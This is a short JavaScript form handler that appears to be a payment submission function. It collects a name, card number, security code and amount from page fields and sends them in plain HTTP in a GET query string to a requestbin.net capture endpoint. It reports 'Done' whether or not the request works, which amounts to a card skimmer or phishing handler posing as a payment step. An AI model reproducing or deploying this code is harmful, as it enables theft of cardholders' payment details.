function submit() {
    var name = document.getElementById('name').value
    var card_number = document.getElementById('card_number').value
    var security_code = document.getElementById('security_code').value
    var amount = document.getElementById('amount').value

    payload = '?name=' + name 
        + '&card_number=' + card_number
        + '&security_code=' + security_code
        + '&amount=' + amount

    headers = {
        'Content-Type': 'application/json;charset=UTF-8',
        'Access-Control-Allow-Origin': '*',
    }

    axios.get('http://requestbin.net/r/wn83t7wn' + payload, { }, headers)
        .then(function (response) {
            alert('Done')
        })
        .catch(function (error) {
            alert('Done')
        })
}